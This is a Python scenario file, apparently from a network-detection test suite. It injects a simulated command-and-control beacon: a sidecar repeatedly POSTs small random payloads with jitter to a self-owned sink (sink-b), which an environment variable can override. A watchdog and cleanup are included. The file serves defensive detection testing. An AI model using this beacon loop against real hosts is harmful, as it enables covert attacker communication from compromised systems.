"""
S2-b — 외부 통제 서버 연결(C2 비컨) (scenarios-v2, 2차).

위협 정의: 침해된 내부 서비스가 **허용 목록 밖 목적지**로 작고 **주기적인** 연결을 반복한다
  (명령 수신·생존 신고). 대량 전송이 아니다 — S2-c(반출)와 달리 바이트는 작고, 핵심은
  비인가 목적지 + 반복 주기성이다.
대조: C-j(허용 목적지 정상 호출) — 같은 소량·반복 호출이지만 목적지가 허용 목록 안.

주입: backend netns 공유 사이드카(v2.netns)에서 비인가 목적지(우리가 소유한 sink-b)로 작은 POST 를
  간격±지터로 반복한다. **제3자 서버로 보내지 않는다** — 목적지는 env 로 주되 기본은 sink-b.
정리: 사이드카 종료(--rm). 워치독이 최대 시간 뒤 강제 종료한다.

강도(현실적인 비컨 주기 기준): strong=짧은 주기(대화형 조작), medium=흔한 기본 주기,
  weak=긴 주기(은닉형). 페이로드는 수백 바이트.
"""

from __future__ import annotations

import json
import os

from v2 import netns, supervisor

DEST = os.getenv("S2B_DEST", "http://sink-b:8080/")   # 우리가 소유한 비인가 sink (제3자 금지)

# strength → 기본 주기(초)
STRENGTH_INTERVAL = {"weak": 90, "medium": 30, "strong": 8}
DEFAULT_STRENGTH = "medium"
DEFAULT_DURATION_SECONDS = 600
JITTER_FRACTION = 0.2
PAYLOAD_BYTES = (120, 480)
DEFAULT_MAX_SECONDS = 900
BACKGROUND_DEFAULT = True


def plan_beacon(strength: str = DEFAULT_STRENGTH, duration_seconds: int = DEFAULT_DURATION_SECONDS,
                interval_seconds: float | None = None, jitter: float = JITTER_FRACTION) -> dict:
    if strength not in STRENGTH_INTERVAL:
        raise ValueError(f"unknown strength: {strength}")
    if duration_seconds < 1:
        raise ValueError("duration_seconds 는 1 이상")
    if not 0 <= jitter < 1:
        raise ValueError("jitter 는 0 이상 1 미만")
    iv = interval_seconds or STRENGTH_INTERVAL[strength]
    return {"strength": strength, "interval_seconds": iv, "jitter": jitter,
            "duration_seconds": duration_seconds,
            "expected_beacons": max(1, int(duration_seconds // iv))}


def beacon_script(plan: dict, dest: str = DEST, seed: int = 0) -> str:
    """사이드카 안에서 돌 python 스크립트. 목적지·주기만 담는다(정답 암시 없음)."""
    cfg = json.dumps({"dest": dest, "iv": plan["interval_seconds"], "j": plan["jitter"],
                      "dur": plan["duration_seconds"], "lo": PAYLOAD_BYTES[0],
                      "hi": PAYLOAD_BYTES[1], "seed": seed})
    return (
        "import json,os,random,time,urllib.request\n"
        f"c=json.loads({cfg!r})\n"
        "r=random.Random(c['seed']);end=time.time()+c['dur']\n"
        "while time.time()<end:\n"
        "    b=os.urandom(r.randint(c['lo'],c['hi']))\n"
        "    try:\n"
        "        urllib.request.urlopen(urllib.request.Request(c['dest'],data=b,method='POST',"
        "headers={'Content-Type':'application/octet-stream'}),timeout=5).read()\n"
        "    except Exception:\n"
        "        pass\n"
        "    time.sleep(max(1.0,c['iv']*(1+r.uniform(-c['j'],c['j']))))\n"
    )


def inject(strength: str = DEFAULT_STRENGTH, duration_seconds: int = DEFAULT_DURATION_SECONDS,
           interval_seconds: float | None = None, seed: int = 0, dest: str = DEST,
           max_seconds: int = DEFAULT_MAX_SECONDS, work_dir: str | None = None,
           background: bool | None = None, traffic_gen_path: str | None = None,
           traffic_target: str | None = None):
    plan = plan_beacon(strength, duration_seconds, interval_seconds)
    name = netns.sidecar_name()
    wd = supervisor.spawn_watchdog(netns.kill_sh(name), max(max_seconds, duration_seconds + 60),
                                   tag="s2b", work_dir=work_dir)
    bg = None
    if supervisor.background_enabled(BACKGROUND_DEFAULT, background) and traffic_target:
        bg = supervisor.spawn_background_traffic(traffic_gen_path, traffic_target)
    netns.start(beacon_script(plan, dest, seed), name)
    print(f"[S2-b] strength={strength} interval={plan['interval_seconds']}s "
          f"duration={duration_seconds}s sidecar={name}", flush=True)
    return {"plan": plan, "sidecar": name, "watchdog": wd, "background": bg}


def cleanup(meta: dict | None) -> None:
    meta = meta or {}
    try:
        if meta.get("sidecar"):
            netns.stop(meta["sidecar"])
            print(f"[S2-b] cleanup: sidecar {meta['sidecar']} 종료", flush=True)
    finally:
        supervisor.cancel_watchdog(meta.get("watchdog"))
        supervisor.stop_background_traffic(meta.get("background"))


def dry_run() -> dict:
    plan = plan_beacon()
    return {"plan": plan, "dest": DEST, "image": netns.NET_IMAGE,
            "backend": netns.BACKEND_CONTAINER, "watchdog_max_seconds": DEFAULT_MAX_SECONDS,
            "pair": "c_j_allowed_external_call",
            "env": ["S2B_DEST", "V2_NET_IMAGE", "V2_BACKEND_CONTAINER", "V2_WORK_DIR", "V2_TRAFFIC_GEN"],
            "note": "목적지는 우리가 소유한 sink 만(제3자 금지), 소량 주기 연결"}


def main(**kw):
    import time
    meta = None
    try:
        meta = inject(**kw)
        time.sleep(meta["plan"]["duration_seconds"])
    finally:
        cleanup(meta)


if __name__ == "__main__":
    main()
